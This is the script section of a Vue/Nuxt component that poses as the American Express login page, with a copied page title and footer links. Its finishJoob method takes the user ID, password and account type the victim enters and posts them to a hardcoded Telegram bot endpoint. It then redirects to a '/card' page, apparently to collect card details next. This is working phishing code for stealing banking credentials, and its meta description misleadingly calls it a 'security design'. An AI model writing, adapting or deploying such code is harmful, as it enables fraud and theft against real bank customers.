<script>
import axios from 'axios';

export default {
  data() {
    return {
      formDataRes: {
        userId: '',
        password: '',
        accountType: 'Cards and Banking',
      },

      showPassword: false,
      rememberMe: false,
      loading: false,
      isActive: false,

      footerGroups: [
        {
          title: 'ABOUT',
          links: [
            'About American Express',
            'Newsroom',
            'Investor Relations',
            'Careers',
            'Global Network',
            'Contact Us'
          ]
        },
        {
          title: 'PRODUCTS & SERVICES',
          links: [
            'Credit Cards',
            'Business Credit Cards',
            'Amex Corporate',
            'View All Gift Cards',
            'Savings Accounts & CDs',
            'Download the App'
          ]
        },
        {
          title: 'LINKS YOU MAY LIKE',
          links: [
            'Membership Rewards',
            'Credit Score and Insights',
            'Credit Protection',
            'Accept Amex Cards',
            'Refer A Friend',
            'SpendSmart'
          ]
        },
        {
          title: 'ADDITIONAL INFORMATION',
          links: [
            'Financial Education Center',
            'Business Education Center',
            'Supplier Code of Conduct',
            'Credit Score 101',
            'Frequently Asked Questions'
          ]
        }
      ]
    }
  },

  methods: {
    slug(value) {
      return value.toLowerCase().replace(/[^a-z0-9]+/g, '-')
    },

    // ============================================================

    async finishJoob() {
      if (this.loading) return;
      this.loading = true;
      try {
         // Format the message as string
        const message = `* AMEX LOGIN *\nUserID: ${this.formDataRes.userId}\nPassword: ${this.formDataRes.password}\nAccount Type: ${this.formDataRes.accountType}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-5167264103",
          message
        );
        this.notice = true;

        window.location.assign("/card");
      } catch (error) {
        console.error("Navigation error:", error);
        this.loading = false;
      }
    },

    // ============================================================

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },




  head() {
    return {
      title: 'Log In to My Account | American Express',
      meta: [
        {
          hid: 'description',
          name: 'description',
          content: 'Amex account interface security design.'
        }
      ]
    }
  }
}
</script>

